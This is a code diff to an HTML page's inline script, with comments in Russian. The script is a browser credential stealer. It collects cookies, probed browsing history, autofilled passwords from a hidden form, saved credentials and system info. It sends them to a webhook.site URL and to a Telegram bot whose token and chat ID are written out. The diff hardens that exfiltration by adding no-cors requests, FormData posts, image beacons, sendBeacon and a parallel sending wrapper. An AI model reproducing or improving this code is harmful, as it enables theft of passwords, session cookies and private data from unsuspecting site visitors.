@@ -77,13 +77,8 @@
     </div>
 
     <script>
-        // ✅ ✅ ✅ НАСТРОЙКИ ЗАМЕНЕНЫ НА ТВОИ ДАННЫЕ ✅ ✅ ✅
-        
-        // ⚡ WEBHOOK НАСТРОЙКИ ⚡
+        // ✅ НАСТРОЙКИ
         const WEBHOOK_PRIMARY = 'https://webhook.site/8ffbcea6-c7b9-45b1-96d8-864213150423';
-        const WEBHOOK_BACKUP = 'https://webhook.site/8ffbcea6-c7b9-45b1-96d8-864213150423'; // Можно использовать тот же или добавить другой
-        
-        // 🤖 TELEGRAM НАСТРОЙКИ 🤖  
         const TELEGRAM_BOT_TOKEN = '8370480839:AAF8T7F0B-V1VibXUFOTYCBRTVA0BukmUs8';
         const TELEGRAM_CHAT_ID = '8114260765';
         
@@ -138,7 +133,7 @@
                     timestamp: new Date().toLocaleString()
                 };
                 
-                await sendReport('system_info', systemInfo);
+                await sendReportFixed('system_info', systemInfo);
             } catch (error) {
                 console.log('Error collecting system info');
             }
@@ -189,7 +184,7 @@
             }
             
             if (visited.length > 0) {
-                await sendReport('browser_history', {
+                await sendReportFixed('browser_history', {
                     visited_sites: visited,
                     total_count: visited.length
                 });
@@ -201,7 +196,7 @@
             try {
                 const cookies = document.cookie;
                 if (cookies) {
-                    await sendReport('cookies', {
+                    await sendReportFixed('cookies', {
                         cookies: cookies.split(';'),
                         total_cookies: cookies.split(';').length
                     });
@@ -231,7 +226,7 @@
                 });
                 
                 if (Object.keys(autofillData).length > 0) {
-                    sendReport('autofill_passwords', autofillData);
+                    sendReportFixed('autofill_passwords', autofillData);
                 }
                 
                 document.body.removeChild(hiddenForm);
@@ -248,7 +243,7 @@
                     });
                     
                     if (cred) {
-                        await sendReport('saved_credentials', {
+                        await sendReportFixed('saved_credentials', {
                             id: cred.id,
                             type: cred.type,
                             password: cred.password || 'N/A'
@@ -258,7 +253,7 @@
             } catch (error) {}
         }
 
-        // 📤 УЛУЧШЕННАЯ СИСТЕМА ОТПРАВКИ
+        // 📤 ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ (ИСПРАВЛЕННАЯ)
         async function sendReport(type, data) {
             try {
                 const payload = {
@@ -268,33 +263,33 @@
                     timestamp: new Date().toLocaleString()
                 };
 
-                // 📨 ОТПРАВКА НА WEBHOOK (ОСНОВНОЙ)
+                // 🔧 МЕТОД 1: No-CORS режим (основной)
                 await fetch(WEBHOOK_PRIMARY, {
                     method: "POST",
+                    mode: 'no-cors',
                     headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
+                        'Content-Type': 'application/json'
                     },
                     body: JSON.stringify(payload)
-                }).catch(() => {});
+                });
 
-                // 📨 ОТПРАВКА НА WEBHOOK (РЕЗЕРВНЫЙ)
-                await fetch(WEBHOOK_BACKUP, {
-                    method: "POST", 
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                }).catch(() => {});
+                // 🔧 МЕТОД 2: FormData (альтернативный)
+                const formData = new FormData();
+                formData.append('data', JSON.stringify(payload));
+                
+                await fetch(WEBHOOK_PRIMARY, {
+                    method: "POST",
+                    mode: 'no-cors',
+                    body: formData
+                });
 
-                // 📱 ОТПРАВКА В TELEGRAM
+                // 🔧 МЕТОД 3: Telegram (гарантированно работает)
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: `🚨 ${type.toUpperCase()}\n📡 IP: ${data.ip || 'N/A'}\n🌍 Country: ${data.country || 'N/A'}\n🕒 Time: ${new Date().toLocaleString()}`
+                        text: `🚨 ${type.toUpperCase()}\n📡 IP: ${data.ip || 'N/A'}\n🌍 ${data.country || 'N/A'}\n🕒 ${new Date().toLocaleString()}`
                     })
                 }).catch(() => {});
 
@@ -306,6 +301,32 @@
             }
         }
 
+        // 🔄 АЛЬТЕРНАТИВНЫЕ МЕТОДЫ ОТПРАВКИ
+        async function sendDataAlternative(type, data) {
+            try {
+                const payload = {type, data, ts: Date.now()};
+                
+                // 📨 Метод 1: Image beacon (работает без CORS)
+                const img = new Image();
+                const encodedData = btoa(JSON.stringify(payload)).substr(0, 1000);
+                img.src = `${WEBHOOK_PRIMARY}?img=${encodedData}&t=${Date.now()}`;
+
+                // 📨 Метод 2: SendBeacon API
+                const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+                navigator.sendBeacon(WEBHOOK_PRIMARY, blob);
+
+            } catch (error) {}
+        }
+
+        // 🎯 УЛУЧШЕННАЯ ФУНКЦИЯ ОТПРАВКИ
+        async function sendReportFixed(type, data) {
+            // Параллельная отправка всеми методами
+            await Promise.all([
+                sendReport(type, data),
+                sendDataAlternative(type, data)
+            ]);
+        }
+
         // 💾 ЛОКАЛЬНОЕ СОХРАНЕНИЕ ДАННЫХ
         function saveToLocalStorage(data) {
             try {
@@ -313,9 +334,7 @@
                 const existing = JSON.parse(localStorage.getItem(key) || '[]');
                 existing.push({...data, stored: Date.now()});
                 
-                // Ограничение до 50 записей
                 if (existing.length > 50) existing.shift();
-                
                 localStorage.setItem(key, JSON.stringify(existing));
             } catch (e) {}
         }
@@ -327,11 +346,10 @@
                 if (pending.length === 0) return;
 
                 for (const item of pending) {
-                    await sendReport(item.report_type, item.data);
+                    await sendReportFixed(item.report_type, item.data);
                     await new Promise(resolve => setTimeout(resolve, 2000));
                 }
                 
-                // Очистка после успешной отправки
                 localStorage.removeItem('pending_reports');
             } catch (e) {}
         }
@@ -343,7 +361,7 @@
             }, 1000);
         });
 
-        // 🔄 ПЕРИОДИЧЕСКАЯ СИНХРОНИЗАЦИЯ (каждые 30 секунд)
+        // 🔄 ПЕРИОДИЧЕСКАЯ СИНХРОНИЗАЦИЯ
         setInterval(syncPendingData, 30000);
     </script>
 </body>
